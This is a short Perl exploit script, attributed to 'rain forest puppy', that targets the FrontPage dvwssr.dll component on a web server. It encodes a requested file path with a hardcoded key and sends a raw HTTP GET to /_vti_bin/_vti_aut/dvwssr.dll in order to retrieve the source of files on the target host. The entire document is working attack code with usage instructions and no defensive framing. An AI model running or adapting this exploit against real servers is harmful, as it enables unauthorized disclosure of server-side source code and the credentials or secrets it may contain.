#!/usr/bin/perl
# dvwssr.pl by rain forest puppy (only tested on Linux, as usual)
#
# Usage: dvwssr.pl target_host /file/to/retrieve/source
#
use Socket;

$ip=$ARGV[0];
$file=$ARGV[1];

print "Encoding to: ".encodefilename($file)."\n";
$url="GET /_vti_bin/_vti_aut/dvwssr.dll?".encodefilename($file)." HTTP/1.0\n\n";
print sendraw($url);

sub encodefilename {
my $from=shift;
my
$slide="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
#
#

my $key="Netscape engineers are weenies!";

#
#
my $kc=length($from);
my ($fv,$kv,$tmp,$to,$lett);
 @letts=split(//,$from);
 foreach $lett (@letts){
  $fv=index $slide, $lett;  
  $fv=index $slide, (substr $slide,62-$fv,1) if($fv>=0);
  $kv=index $slide, substr $key, $kc, 1;
  if($kv>=0 && $fv>=0){
   $tmp= $kv - $fv;
   if($tmp <0){$tmp +=62;}
   $to.=substr $slide, $tmp,1; } else {
   $to.=$lett;}
  if(++$kc >= length($key)){ $kc=0;}
 }return $to;}

sub sendraw {
        my ($pstr)=@_;
        my $target;
        $target= inet_aton($ip) || die("inet_aton problems");
        socket(S,2,1,getprotobyname('tcp')||0) || die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,80,$target)){
                select(S);              $|=1;
                print $pstr;            my @in=<S>;
                select(STDOUT);         close(S);
                return @in;
        } else { die("Can't connect...\n"); }}


